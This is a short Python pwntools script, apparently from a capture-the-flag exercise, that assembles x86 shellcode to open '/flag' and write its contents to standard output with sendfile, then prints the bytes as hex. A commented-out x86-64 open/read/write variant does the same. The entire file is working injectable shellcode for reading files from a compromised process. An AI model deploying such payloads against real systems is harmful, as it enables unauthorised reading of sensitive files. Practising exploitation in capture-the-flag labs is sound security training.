#!/usr/bin/python3

from pwn import *

context.arch = 'x86'

# context.arch = 'arm'

# shellcode = asm(shellcode)
# shellcode = '''
# mov r15, 0x67616c662f2e
# push r15
# mov rdi, rsp
# mov rsi, 0
# mov rax, 2
# syscall

# mov r14, 3
# mov rdi, r14
# mov rsi, rsp
# mov rdx, 0xff
# mov rax, 0
# syscall

# mov rdi,1
# mov rsi, rsp
# mov rdx, 0xff
# mov rax, 1
# syscall
# '''

s = '''
    /* push '/flag\x00' */
    push 0x67
    push 0x616c662f
    /* open(file='esp', oflag='O_RDONLY', mode='edx') */
    mov ebx, esp
    xor ecx, ecx
    /* call open() */
    push SYS_open /* 5 */
    pop eax
    int 0x80
    /* sendfile(out_fd=1, in_fd='eax', offset=0, count=0x40) */
    push 1
    pop ebx
    mov ecx, eax
    xor edx, edx
    push 0x40
    pop esi
    /* call sendfile() */
    xor eax, eax
    mov al, 0xbb
    int 0x80
'''
# s = shellcraft.cat('/flag')
s = asm(s)
print(s.hex())